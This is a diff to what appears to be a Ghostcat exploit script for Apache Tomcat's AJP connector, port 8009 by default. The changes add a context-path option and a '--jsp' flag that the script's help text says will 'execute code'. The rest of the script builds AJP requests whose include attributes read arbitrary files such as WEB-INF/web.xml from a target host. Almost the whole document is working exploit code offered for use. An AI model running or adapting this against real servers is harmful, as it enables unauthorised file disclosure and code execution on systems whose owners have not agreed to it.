@@ -289,11 +289,13 @@ javax.servlet.include.servlet_path
 import argparse
 parser = argparse.ArgumentParser()
 parser.add_argument("target", type=str, help="Hostname or IP to attack")
+parser.add_argument("-c", '--context', type=str, default='', help="Context path of the app. Example : /ghostcat-demo")
+parser.add_argument('--jsp', action='store_true', help="add jsp to the file requested to execute code")
 parser.add_argument('-p', '--port', type=int, default=8009, help="AJP port to attack (default is 8009)")
 parser.add_argument("-f", '--file', type=str, default='WEB-INF/web.xml', help="file path :(WEB-INF/web.xml)")
 args = parser.parse_args()
 t = Tomcat(args.target, args.port)
-_,data = t.perform_request('/asdf',attributes=[
+_,data = t.perform_request('{}/asdf{}'.format(args.context, '.jsp' if args.jsp else ''),attributes=[
     {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
     {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},
     {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
